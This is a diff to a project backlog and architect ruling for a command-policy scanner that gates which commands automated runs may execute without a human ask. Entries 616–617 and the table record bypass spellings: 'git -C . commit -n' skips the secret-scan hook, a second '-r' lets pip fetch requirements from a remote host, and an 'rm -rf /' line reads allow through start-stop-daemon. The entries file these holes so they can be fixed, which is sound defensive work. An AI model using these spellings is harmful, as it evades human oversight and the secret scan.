@@ -16906,6 +16906,65 @@ Proved through the real adapter with `max_pages: 1` and a second page holding th
 
 **Depends on** nothing. It touches no product code, and WP-215 (backlog 612, the `{1}` quoting) is the nearest neighbour.
 
+### 616. **A git global option that takes a value (`-C <dir>`, `-c <key>=<v>`) moves every `git <subcommand>* …` floor's words out of place, so `git -C . commit -n -m y` and `git -c user.name=x commit -n -m y` read `auto` while `git --no-pager commit -n -m y` reads `hazard`** (TODO, **major, fail-open under `auto`, live, pre-existing**. **Owned by WP-217** (§ "Architect ruling (M12 third amendment, session 18)"; the text below that says no package owns it predates the ruling). The refiner grades it as the implementer did, on TD-030 decision 2: git ships in the stock image (`docker/base.Dockerfile`), the line is literal, it is one line, and `-n` on `git commit` skips the pre-commit hook, which is the repository's secret scan (BD-002). This is tier 2, where a floor's hazardous options and their program's grammar live. It is **not** 613's cluster rule, and **not** WP-216's rule: WP-216 (backlog 614) lists an expansion attached to a *wrapper's* option word as a possible command word in `commandNameWalk`, and its ruling (c) excludes git's `-c$x` by name. This finding is about where a literal *floor* finds the subcommand. Found and measured by WP-214's implementer, session 18 (*Discovered work*, `#### WP-214`). The refiner read `command-policy.ts` on WP-214's uncommitted tree over `dd0113b2` and ran nothing. **No work package owns it — an architect pass places it.** Its nearest neighbour is WP-214's tier-2 rule (*a floor's short option is read by its program's own parser*). This finding is the same idea applied to the operands, and it touches the same file.)
+
+**What is wrong.** A floor written `git commit* -n*` meets the line's operands by place in the `hazard` reading. git's top-level `-C` and `-c` take the next word as their value. So in `git -C . commit -n`, the value `.` stands where the floor expects `commit*`, and the floor never matches. `--no-pager` takes no value, so nothing shifts and the floor matches.
+
+**Evidence.** Quoted from WP-214's notes: *"a git global option before the subcommand moves every git floor's words off place. `git -C . commit -n -m y` and `git -c user.name=x commit -n -m y` read `ask / auto / deny`, while `git --no-pager commit -n -m y` reads `hazard`. The `hazard` reading matches command words by place, and git's top-level `-C`/`-c` take a value. This is not 613's cluster rule."* The cells are attended / `auto` / `deny`, from `scratchpad/wp214/probe.mjs` through `corpusCells`, with nothing executed. The refiner's reading of the mechanism, line numbers on `wt-wp214`:
+- `tokensMatch` (`command-policy.ts:3160-3170`) passes `splitFlags(commandTokens).positional` to `entryOperandsMet` (`:3142`), which goes through `entryReach` (`:3118`). `splitFlags` does not know `-C` takes a value, so `.` (or `user.name=x`) becomes the second positional.
+- WP-214's own `getoptValuedLetters` (`:3028`) takes `[program, subcommand] = positional` by place too. Behind a global option it reads `.` as the subcommand and answers `''` (no valued letters). That fails closed, but only once the floor matches at all.
+- The module already has the reader that skips git's global options. `gitSubcommandOf` (`:1248`) skips each word in `GIT_GLOBAL_VALUE_OPTIONS` (`:1236`: `-C`, `-c`, `--git-dir`, `--work-tree`, `--namespace`, `--config-env`, `--super-prefix`, `--attr-source`) together with its value. That is why the abbreviation floors read `git -C . commit --no-verif -m x` as `ask / hazard / hazard` (WP-161's table in this file). The glob floors do not use it.
+
+**Needs measurement** before anyone starts:
+1. Which floors are affected. The hypothesis is every floor whose pattern names a subcommand by place: `git commit* -n*`, `git merge* -s*`, `git merge* -X*`, `git am* -n*` and `git clone* -u*`. Floors written `git * …` should survive.
+2. Whether the separate-word spellings `--git-dir <d>`, `--work-tree <d>`, `--namespace <n>` and `--config-env <n>` shift the floors the same way.
+3. Whether the long spelling `git -C . commit --no-verify -m y` is caught by another entry.
+Only the two `-C`/`-c` lines above are measured.
+
+**What it costs to leave.** Under `auto`, a run can skip the commit hooks with no human ask by putting a harmless `-C .` in front of `commit -n`. `-c user.name=x` is a spelling a developer run already uses (backlog 468), so it would not stand out in a transcript.
+
+**Done when** each git floor finds the subcommand the way git does: past every global option in `GIT_GLOBAL_VALUE_OPTIONS` and its value. `getoptValuedLetters` must get its subcommand the same way, so WP-214's table applies behind a global option. The over-ask is measured first on WP-208's corpus (TD-030 decision 3). Rows needed:
+- `git -C . commit -n -m y`, `git -c user.name=x commit -n -m y`, `git --git-dir .git commit -n -m y` and `git -C . merge -ns ours origin/main`, each `ask / hazard / hazard`;
+- `git --no-pager commit -n -m y` unchanged;
+- `git -C . commit -m y` and `git -c user.name=x commit -m y` unchanged, as controls.
+**Canary:** make the floors' subcommand read by place again, and the `-C` row fails.
+
+**Depends on** WP-214's merge, because it is serial on `command-policy.ts` and `unattended-commands.test.ts`, and on WP-216's if that row is still open.
+
+### 617. **`pip install -r req.txt -r http://x/r.txt` reads `allow` in every mode: the `pip install -r http*` floor reads its words by place, so a second `-r` is never compared; and pip's clusters (`-qr http…`) are not floored at all** (TODO, **minor, fail-open even attended, latent on the stock image, pre-existing**. **Split by § "Architect ruling (M12 third amendment, session 18)"**: the second-`-r` half folds into **WP-217**; the cluster half (`-qr http…`) is carried, unowned (no image the platform builds ships pip). The refiner grades it minor on TD-030 decision 2. The spelling is tier 2 and literal, but pip is **not** in the stock image (`docker/base.Dockerfile` installs bash, ca-certificates, curl, git, jq, openssh-client and ripgrep), so the line needs a project image. **Trigger:** a project image with pip, and a project that keeps the default `pip install -r *` allow entry. The fetch also needs the host on the run's egress list. Found and measured by WP-214's implementer, session 18 (*Discovered work*, `#### WP-214`). The refiner read the floor and WP-214's `pip` declaration on `wt-wp214` over `dd0113b2` and ran nothing. **No work package owns it — an architect pass places it.**)
+
+**What is wrong.** Two parts with one cause. The floor (`command-policy.ts:1832` on `wt-wp214`, kind `trust`, hazard *"the allow entry `pip install -r *` is meant to be a lockfile install; a requirements file fetched over the network is not one"*) is a glob that compares the word after the **first** `-r`. pip's parser is optparse. It takes every `-r` and clusters short options, and the floor reads neither way.
+
+**Evidence.** Quoted from WP-214's notes: *"`pip install -r req.txt -r http://x/r.txt` reads `allow / allow / allow`. The `pip install -r http*` floor reads its words by place, so a second `-r` is never compared. pip's clusters (`-qr http…`) are the same floor's residual, listed on the `whole` list."* The cluster half is declared in the module: `FLOOR_OPTION_READINGS.pip` (`:2069-2073`) is `whole`, with the reason *"pip’s parser is optparse (`src/pip/_internal/cli/parser.py`), which does cluster (`-qr`), so `pip install -r http*` keeps the whole-word reading and a cluster spelling is a filed residual"*. The notes also say `pip install -qr http://x/r.txt` reads `ask` attended (through `pip install *`) and `auto` under `auto`, before and after WP-214. That pip's parser is optparse was read on pip's `main` branch on 2026-10-19 and **not** at a pinned version: `[unverified]` for any image's pip.
+
+**What it costs to leave.** A project with pip can be told to install a requirements file fetched over the network with no ask in any mode. That is the exact case the floor exists to stop, and it runs code from setup scripts.
+
+**Done when** every `-r` value is compared, whatever its position, and pip's clusters are read as optparse reads them: `pip` moves from `whole` to `getopt` with its valued letters cited from pip's documentation, or the floor becomes a predicate over the parsed options.
+- Rows: `pip install -r req.txt -r http://x/r.txt`, `pip install -qr http://x/r.txt` and `pip install -rhttp://x/r.txt`, each floored (`ask / hazard / hazard`).
+- Controls: `pip install -r req.txt` and `pip install -qr req.txt` keep `allow`.
+- **Canary:** compare only the first `-r` again, and the two-`-r` row fails.
+**Needs measurement:** whether `--requirement=http…` and `-r=http…` are floored today.
+
+**Depends on** WP-214's merge, for `FLOOR_OPTION_READINGS` and the serial file.
+
+### 618. **The WP-198 (d) row reader in `unattended-commands.test.ts` (`arrayStrings`) loops forever on an unbalanced quote character, such as one inside a regular-expression literal anywhere in that file, because its string scan has no end bound — very likely the unidentified cause of backlog 597's collection hang** (TODO, **minor — a harness hazard, no product behaviour**. **Owned by WP-213** (§ "Architect ruling (M12 third amendment, session 18)"; that half lands after WP-214's merge). Found by WP-214's implementer, session 18 (*Discovered work*, `#### WP-214`). The refiner read the reader on `wt-wp214` and on `main` and ran nothing. **Owned by WP-213** (backlog 597): this entry is the cause 597 says is *"not identified"*, so WP-213's ruling (a) (reproduce first) and ruling (c) (refuse the shape) should start here. **Recommend folding it into 597's entry** when WP-213 lands.)
+
+**What is wrong / the evidence.** Quoted from WP-214's notes: *"the WP-198 (d) row reader in `unattended-commands.test.ts` (`arrayStrings`) loops forever on a quote character inside a regular-expression literal in that file, because its string scan has no end bound. The first version of this row's census regex (`['"]`) hung the whole file with no output. It is written with `\x22\x27\x60` now."* The refiner's reading:
+- `arrayStrings` (`unattended-commands.test.ts:2856` on `wt-wp214`, `:2854` on `main`) scans for a closing quote with `while (source[end] !== char)` and never checks `end < source.length`. Past the end, `source[end]` is `undefined` and the loop never exits.
+- The input is the test file's own source (`SOURCE`, `:2838`, `readFileSync(import.meta.url)`). The call `const ROWS = arrayStrings(SOURCE)` (`:2963`) runs in a `describe` body. That means it runs at collection, so `-t` cannot skip it, and a quote in any other test of the file can trigger it.
+- That matches 597's symptoms: a hang at collection, a worker at 100 % CPU, and *"even under `-t`"*.
+- The reader came in with `6e07b948` (WP-198), which is an ancestor of `a73ab026`, the start of the range WP-213 bisects. So the reader was in the tree when WP-201 hung.
+This is **a hypothesis about 597**: nobody has reproduced 597's literal against this reader.
+
+**What it costs to leave.** Any later regex literal with an odd quote in the 2 373-row file hangs the whole unit tier locally with no output. That is how 597 cost a session.
+
+**Done when**
+- The scan stops at `source.length` and fails the describe with the offset of the unclosed quote, instead of looping.
+- **Canary:** plant `/['"]/` in a fixture copy of the file, and the reader throws naming the offset instead of hanging.
+- 597's entry records whether this was its cause. That is WP-213 (a)'s bisection, with the literal run against this reader.
+
+**Depends on** WP-213, which owns it, and on WP-214's merge, because the file is serial with WP-214 and WP-216.
+
 ### 111. **`scripts/citations.ts` says no Markdown citation exists yet, while 56 lines of Markdown carry one — the guard's own docblock calls dormant the half that has been enforcing rule 11 across five documents** (**RESOLVED** at `c6d3f97`, WP-68, session 8 — nit, TODO — **working as designed**, one sentence to correct; **no work package owns it**; noticed by the orchestrator while making this round's PROGRESS citations resolve, session 5)
 > **M4 (architect, session 6): folded into WP-68.**
 
@@ -20760,7 +20819,10 @@ backlog entry a row folds, and TD-030, before planning a scanner row. **Amended 
 WP-205's merge, serial on `command-policy.ts`, and WP-211 follows WP-214; WP-215 (612, tooling) is
 parallel-safe with every row and goes to the first free implementer. **Amended by § "Architect ruling
 (M12 second amendment, session 18)"**: WP-216 (614, fail-open under `auto`, live) runs right after
-WP-214's merge, serial on `command-policy.ts`, and WP-211 follows WP-216.
+WP-214's merge, serial on `command-policy.ts`, and WP-211 follows WP-216. **Amended by § "Architect
+ruling (M12 third amendment, session 18)"**: WP-217 (616, and 617's two-`-r` half; fail-open under
+`auto`, live) runs right after WP-216's merge, serial on `command-policy.ts`, and WP-211 follows WP-217;
+618 is folded into WP-213, whose reader half takes `unattended-commands.test.ts` after WP-214's merge.
 
 | WP | Title | Status | Commit | Notes |
 |---|---|---|---|---|
@@ -20771,9 +20833,10 @@ WP-214's merge, serial on `command-policy.ts`, and WP-211 follows WP-216.
 | WP-205 | **Scanner: the command walk skips a wrapper's option values and leading operand by that wrapper's declared grammar, and a wrapper with none keeps the both-ways reading** | DONE | `3c2c5002` | Folds **592** (nit, fails closed; carried once by the fourth amendment), **596** (minor, fails closed; WP-201's widening of 592) and, since the sixth amendment, **601** (minor after measurement: `start-stop-daemon`'s `--exec=`/`-xPATH`/`--startas=` value grammar by name). Deps WP-204, WP-193. No migration. Pin the trap rows (a) first (rule 42). Last; serial after WP-204 on `command-policy.ts`; **may slip to M12** if session 17 closes before it — M12's if M11 closes after WP-207, as the sixth amendment recommends. Added by § "Architect ruling (M11 fifth amendment, session 17)". Folds **608** since the M12 ruling (optional, split clause). **Moved to M12** by § "Architect ruling (M12, session 17)"; its row stands as written, its corpus count is WP-208's census diff. Built on `main`, session 17 (moved to M12). A declared grammar for `env`, `timeout`, `nice`, `stdbuf`, `xargs`, `start-stop-daemon`, `sentry-cli monitors run`; every other wrapper listed undeclared with a reason; a census. **Deviation, recorded**: criterion (2)'s unquoted forms (`timeout $t make`) stay uncertain — bash splits the value into the command (measured). Corpus moved no cell. **One review round, REQUEST_CHANGES** (a start-stop-daemon program kept the wrapper's own `--`, so `start-stop-daemon -S --exec=/bin/rm -- -rf /` read allow — pre-existing, in the row through 601; a dead assignment; an unpinned guard), fixed by the implementer; the orchestrator re-probed seven start-stop-daemon spellings (all `deny`) instead of a second round, under the person's stop instruction. Canaries dead but one equivalent mutant. Orchestrator: `verify`, `verify:integration`, `verify:e2e` twice — **PASS** before and after round 1; volumes 70. Filed: 614 (major: `nice -n$n make` — an unquoted expansion attached to a wrapper option). CI on `3c2c5002`: **PENDING**. |
 | WP-214 | **Scanner: a floor's short option is read by its program's own parser — git's letter clusters by their letters, with the letters that take a value ending the cluster, and Go's stay whole** | TODO | — | Folds **613** (**major**, fail-open under `auto`, **live**: `git commit -an -m x` reads `allow` through the shipped `git commit *` entry; git reads `-an` as `-a -n`, and `-n` is `--no-verify`, so the repository's secret scan is skipped — BD-002). TD-030 tier 2. Deps WP-204, WP-205. No migration. Measure (a) first, and read git-commit(1), git-merge(1), git-am(1), git-clone(1) and git-ls-remote(1) at 2.47.3 first; nothing executed. **Right after WP-205's merge**; serial on `command-policy.ts`, `unattended-commands.ts` and their test files, before WP-211. Split clause: the `am` and `clone`/`ls-remote` floors may move; the `commit` and `merge` clusters, the per-program declaration and the census may not. Added by § "Architect ruling (M12 first amendment, session 17)". |
 | WP-216 | **Scanner: a wrapper's option word that may be several words is a possible command word — an unquoted expansion attached to the option is listed by the walk, as one in the value slot already is** | TODO | — | Folds **614** (**major**, fail-open under `auto`, **live**, pre-existing: `nice -n$n make` reads `auto` while bash, with `n="5 echo"`, ran `echo` — WP-205's measurement). TD-030 tier 1 (WP-201's rule at a wrapper's option word). Deps WP-205. No migration. Measure (a) first: 614's five spellings, the `=` and whole-word spellings, two undeclared wrappers, the quoted controls, WP-208's census and the unit-tier count; nothing executed. **Right after WP-214's merge**; serial on `command-policy.ts`, `unattended-commands.ts`, their test files and the verdicts json, before WP-211. Split clause: the undeclared-wrapper half may move; the declared wrappers, the five spellings and the canary may not. Added by § "Architect ruling (M12 second amendment, session 18)". |
+| WP-217 | **Scanner: a floor reads a word written after an option both ways, as a block entry's command words are read — so a global option's value cannot move a floor's subcommand out of place — and a getopt program's valued letters are looked up under the subcommand its parser finds** | TODO | — | Folds **616** (**major**, fail-open under `auto`, **live**, pre-existing: `git -C . commit -n -m y` and `git -c user.name=x commit -n -m y` read `ask / auto / deny` while `--no-pager` reads `hazard` — WP-214's measurement; `-n` skips the secret scan, BD-002) and **617**'s two-`-r` half (minor alone; the same rule's row). TD-030 tier 1 (WP-198's rule, which names the floors). Deps WP-214, WP-216. No migration. Measure (a) first: every git floor behind each git global option that takes a word, pip's lines, WP-208's census and the unit-tier count; nothing executed. **Right after WP-216's merge**; serial on `command-policy.ts`, `unattended-commands.ts`, their test files and the verdicts json, before WP-211. Split clause: git's half may narrow to `GIT_GLOBAL_VALUE_OPTIONS` read exactly if (a) measures an over-ask; the git rows, pip's two-`-r` row, the valued-letter lookup and the canary may not move. 617's cluster half carried. Added by § "Architect ruling (M12 third amendment, session 18)". |
 | WP-211 | **Scanner: every program a platform list names stands on a reader — the planner's tables join the census, `composer` gets its reader, and Yarn 1's `create -c` is read from source** | TODO | — | Folds **606** (minor, latent), **607** (minor, latent), **581** (minor, hypothesis). TD-030 tier 2. Deps WP-196, WP-205, WP-206. No migration. Last scanner row; serial after WP-214 (since the M12 first amendment; WP-205 before it) on `command-policy.ts`; touches the planner's tests in `packages/application`. Split clause: (c) may close by reading alone; (a) and (b) may not move. Added by § "Architect ruling (M12, session 17)". |
 | WP-212 | **Jira: the executor is entered once per port call — the adapter adopts the GitLab shape — and the two fixtures agree on a status id** | TODO | — | Folds **550**'s audit half (minor, record: two `integration_actions` rows and two rate-limit tokens per port call) and **594** (nit). Deps WP-181, WP-192. No migration. Measure (a) first on the replay double through the production executor. Split clause: the interim re-entrant marker ships if the reshaping exceeds two days, with the reshaping filed; (a) and (c) may not move. Parallel-safe with every row; its reviewer not WP-209's in the same round. 538 untouched. Added by § "Architect ruling (M12, session 17)". |
-| WP-213 | **Harness: a local tier's collection is bounded and names the file it was collecting, and the hanging literal is reproduced or refused** | TODO | — | Folds **597** (minor, instrument hazard). The M11 fifth amendment's M12 harness row. No deps. No migration. Reproduce (a) first, under a bound (rule 99). Parallel-safe with every row (`scripts/`, `test/support/`); last. Added by § "Architect ruling (M12, session 17)". |
+| WP-213 | **Harness: a local tier's collection is bounded and names the file it was collecting, and the hanging literal is reproduced or refused** | TODO | — | Folds **597** (minor, instrument hazard) and, since the M12 third amendment, **618** (minor, harness: `arrayStrings` has no end bound — 597's first candidate cause). The M11 fifth amendment's M12 harness row. No deps but, for its reader half, WP-214's merge. No migration. Reproduce (a) first, under a bound (rule 99), starting at `arrayStrings`. Parallel-safe with every row (`scripts/`, `test/support/`) **except** its reader half, which edits `unattended-commands.test.ts` after WP-214's merge, confined to `arrayStrings` and its describe, and rebases onto whichever scanner row merges first; last. Added by § "Architect ruling (M12, session 17)"; widened by § "Architect ruling (M12 third amendment, session 18)". |
 | WP-215 | **Tooling: the commit-msg hook passes git's message path as one word, so a commit in a linked worktree under a spaced path runs commitlint** | DONE | `97bc35c8` | Built on `main`, session 18, beside WP-214 in the worktree `../wt-wp214`. `lefthook.yml` passes `--edit "{1}"`; `scripts/lefthook-worktree.test.ts` (the `process` project, `COMMIT_HOOK_SUITE`) commits from a linked worktree under a spaced path with the real hook — accepted, a non-conventional merge refused while `COMMIT_EDITMSG` holds a good message, a non-conventional commit refused — with inherited `LEFTHOOK*` dropped. One review round (round 1: a bare `--edit` survived the suite — the merge case added; inherited `LEFTHOOK_*` — dropped). Canaries: unquoted `{1}`, bare `--edit` (re-run by the orchestrator: dead, `expected +0 not to be +0`), `run: exit 0`, `PROCESS_SUITES` without the suite — each dead by a named test. Orchestrator: `PASS: verify` (rc 0, load 7.88). The orchestrator ran the bare-`--edit` canary file once at a one-minute load of 21 without gating — a machine-rule breach, recorded. Discovered: **615** (minor). Folds **612** (minor, tooling, no product behaviour; live on this machine — 553's space class at `lefthook.yml:22`, which 553's fix did not reach). No deps. No migration. Reproduce (a) first in a spaced scratch repository (`scratchGitEnv`, WP-162), then measure which `--edit` spelling commitlint 21.2.2 honours in a worktree, and `{staged_files}` with a spaced staged path. Parallel-safe with every row (`lefthook.yml`, one process-tier check); first free implementer, before the next session that runs rows in worktrees. Added by § "Architect ruling (M12 first amendment, session 17)". |
 
 ## WP notes (decisions, assumptions, reviewer findings)
@@ -49103,6 +49166,116 @@ WP-216 from this pass; marking it so is the orchestrator's. Nothing is marked RE
 
 **Next:** **WP-214**, then **WP-216**, then WP-211 (now after WP-216), with WP-212, WP-213 and WP-215
 parallel-safe beside them in the table's order.
+
+### Architect ruling (M12 third amendment, session 18) — a floor reads a word after an option both ways, as a block entry already does, and the hang 597 could not name goes to WP-213
+
+Written 2026-10-19 at `8eeb3eb9`, WP-208, WP-209, WP-210, WP-204, WP-205 and WP-215 DONE, WP-214 in review
+in `../wt-wp214` (uncommitted), WP-216, WP-211, WP-212 and WP-213 TODO. This pass covers the three
+headings WP-214's *Discovered work* filed — **616** and **617** with no owner, **618** with the refiner's
+recommendation — and nothing else: § "Architect ruling (M12, session 17)" and its first and second
+amendments hold for every entry they list. No test tier and no Docker ran. `command-policy.ts` was read on
+WP-214's tree at `tokensMatch`, `operandStart`, `entryStep`, `entryReach`, `getoptValuedLetters`,
+`flagValuePositions`, `gitSubcommandOf`, `FLOOR_OPTION_READINGS` and the git and pip rows of
+`HAZARDOUS_ARGUMENTS`; WP-214's notes were read for the three findings; TD-030 was read for decisions 1–3.
+Nothing was measured by this pass (rule 98): 616's two lines and 617's two-`-r` line are WP-214's
+implementer's verdicts, handed to the row to measure first. Line numbers are `wt-wp214`'s and move when
+WP-214 merges.
+
+**What 616 is, read off the code.** The `hazard` reading has no operands — `operandStart` returns the
+entry's length — so every word of a floor is a command word matched by place, and `tokensMatch` hands
+`entryOperandsMet` no `skippable`, so a line word may be left out only past the entry's last word. A block
+entry already has the answer: WP-198 (backlog 584) reads a word written after an option with no `=` both
+ways, as that option's value and as a word (`flagValuePositions`, `:3180`), because, in the docblock of
+`blockEntryBehindFlagValue`, *"Which options take a value is a fact about each program the matcher does
+not know"*. The floors never got it. So in
+`git -C . commit -n` the `.` stands where `commit*` must and the floor misses, while `--no-pager` adds no
+word and nothing shifts. By reading, the floors a global option displaces are the **seven glob floors that
+name a subcommand** — `git clone* -u*` (`:1506`), `git push* *:*` (`:1647`), `git commit* -n*` (`:1665`),
+`git am* -n*` (`:1669`), `git merge* -s*`, `git merge* --strategy*` and `git merge* -X*` (`:1686-1697`).
+Expected to hold, because they do not read the subcommand by place: the nine `git * …` globs (their `*`
+takes the value), the `--exec`/`-x` and `--extcmd`/`-x` predicates (`positional.includes`) and WP-161's
+abbreviation floors (`gitSubcommandOf`). That list is a hypothesis for the row's (a), not a measurement.
+WP-214's own lookup has the same fault one step later: `getoptValuedLetters` takes the second positional
+as the subcommand, reads `.` behind `-C .`, and answers `''` — fail-closed, but it over-reads
+`git -C . commit -mn` (a message `n`) as `-m -n`.
+
+**617's first half is the same defect; its second half is WP-214's rule.** `pip install -r http*` is three
+command words by place, so in `pip install -r req.txt -r http://x/r.txt` the `req.txt` stands where `http*`
+must, exactly as `.` stands where `commit*` must. Read both ways, `req.txt` is the first `-r`'s value and
+`http://x/r.txt` meets the floor. The cluster half — `-qr http…`, `-rhttp…` — is a floor's short option
+read by its program's parser, which is WP-214's rule; WP-214 declared pip `whole`, with the reason stated
+at `FLOOR_OPTION_READINGS.pip`.
+
+**Graded major, as filed; tier 1.** TD-030 decision 1 names, among tier 1's four rules, that *the block
+list, the floors and the boundary read argv as the shell builds it (WP-198)*; the both-ways reading is how
+WP-198 reads a word it cannot place, and the floors were named in that rule without being given it. On
+decision 2: git ships in the stock image, the line is literal and one line, and `-n` skips the pre-commit
+hook that runs the secret scan (BD-002) — major, **fail-open under `auto`, live**. 617's two-`-r` half is a
+row of the same rule and grades **minor** on its own (pip is in no image the platform builds, by 617's
+reading of `docker/base.Dockerfile`), but it is not a second rule and the row carries it at no cost.
+
+**Why not git's own list, which 616's *Done when* proposes.** Skipping `GIT_GLOBAL_VALUE_OPTIONS` the way
+`gitSubcommandOf` does is exact for git, and it is the **narrowing**, not the rule. Its omission fails open
+— a global option git adds, or one the set misses, puts the floor out of place again and the line reads
+`auto` — which TD-030 tier 2's admission test refuses as a design (*an enumeration is admitted only when
+its omission fails closed*). And it is git's alone: `pip --proxy http://p install --target /x`, or any
+floored program with a global option that takes a word, keeps the defect. The both-ways reading only adds
+matches, so it fails closed, and it is one argument in `tokensMatch`.
+
+**The rule for WP-217: a floor's words are read as a block entry's command words are — a word written after
+an option with no `=` may be that option's value, so it is read both ways (WP-198's `flagValuePositions`) —
+and a getopt program's valued letters are looked up under the subcommand its own parser finds
+(`gitSubcommandOf` for git), never the second positional.** The second clause is not a second rule: it is
+the same question (*where is the subcommand?*) asked by WP-214's lookup, and without it the row's
+`git -C . commit -mn` control over-asks. **The over-ask, named:** a word after an option that takes no value
+(`git --no-pager log …`) may now be left out, so a floor can meet a line whose skipped word was the real
+subcommand; expected rare, measured in (a) on WP-208's census. **Split clause:** if (a) measures a corpus
+line moving that git's own set would not move, git's half narrows to `GIT_GLOBAL_VALUE_OPTIONS` read
+exactly (through `gitSubcommandOf`), argued at tier 2, and every program not declared keeps the both-ways
+reading; the git rows, pip's two-`-r` row, the valued-letter lookup and the canary may not move. **Not this
+row's:** 617's cluster half (carried, below); WP-200's configuration-key path (`-c core.hooksPath=…`); 587's
+`-C <dir>` repository discovery (TD-030 tier 3, pinned); the block entries, which WP-198 already reads both
+ways (`uncertain`); and an operand written *before* the option (`pip install foo -r http://x/r.txt`), which
+no value reading explains — (a) measures it, and if it reads `allow` it is filed, not built here.
+
+**617's cluster half is carried.** Minor, latent: pip is in no image the platform builds, so TD-030 tier
+2's citation *at the image's pinned version* has no version to cite, and pip's optparse reading is
+`[unverified]` at any version a project image would carry (WP-214's notes read pip's `main` branch). It is
+not WP-211's: WP-211's rule is that a program a platform list names stands on a reader, and pip does; this
+is the reading of pip's options, WP-214's rule. It reopens as a row when a project image with pip is a
+configuration the operator guide documents, or when a review finds a literal cluster spelling reaching
+`allow` attended. WP-217's (a) records `-qr http…`, `-rhttp…`, `--requirement http…`,
+`--requirement=http…` and `-r=http…` so the carried half is stated with numbers, not hypotheses.
+
+**618 goes to WP-213, as the refiner recommends.** It is the first candidate for the cause 597 could not
+name, so WP-213's (a) starts at `arrayStrings` (`unattended-commands.test.ts:2856` on `wt-wp214`): the
+bisected literal, once found, is run against the reader under the bound (rule 99), and 597's entry records
+whether it was the cause. **Whatever (a) finds, the reader's scan gets its end bound** and fails the
+describe naming the unclosed quote's offset, with 618's canary (a planted `/['"]/` in a fixture copy
+throws, naming the offset, rather than hangs). If 618 is 597's cause, that bound **is** WP-213's (c) —
+the shape is refused where it is read — and the census (c) describes is not built; if it is not, (c)
+stands as written. WP-213 now edits `unattended-commands.test.ts`, the file every scanner row holds, so it
+is **no longer parallel-safe there**: its reader half lands after WP-214's merge, confined to
+`arrayStrings` and its describe (a region no scanner row edits), and rebases onto whichever scanner row
+merges first; its (b), in `scripts/` and `test/support/`, stays parallel-safe.
+
+**Placement: WP-217 right after WP-216's merge, before WP-211.** It has WP-216's grade (major, fail-open
+under `auto`, live); WP-216 was placed and briefed first by the second amendment, and the two edit
+`command-policy.ts`, `unattended-commands.ts`, their test files and WP-208's verdicts json, so they are
+serial whichever goes first, and the queue keeps its order. WP-211 now follows WP-217. WP-217 depends on
+WP-214's merge (it edits WP-214's `tokensMatch` call and `getoptValuedLetters`) and on WP-216's (serial).
+WP-212 stays parallel-safe with every row.
+
+**Decisions.** None amended. TD-030 decision 1 already names the floors in WP-198's tier-1 rule; WP-198's
+both-ways reading is extended to the `hazard` reading, not changed; WP-214's lookup is corrected to read the
+subcommand where git does; BD-002 and BD-025 unchanged; product/19 untouched (Q120 stands). The next free
+migration stays **0092**; WP-217 takes none, nor does WP-213's widened half. No `docs/research/` file is
+written (rule 98). From this pass heading **616** is owned by WP-217, heading **617** by WP-217 for its
+two-`-r` half with its cluster half carried, and heading **618** by WP-213; marking them so is the
+orchestrator's. Nothing is marked RESOLVED by this pass.
+
+**Next:** **WP-214** (in review), then **WP-216**, then **WP-217**, then WP-211 (now after WP-217), with
+WP-212 parallel-safe and WP-213 after WP-214's merge for its reader half.
 
 ## WP notes — session 14 (M10)
 
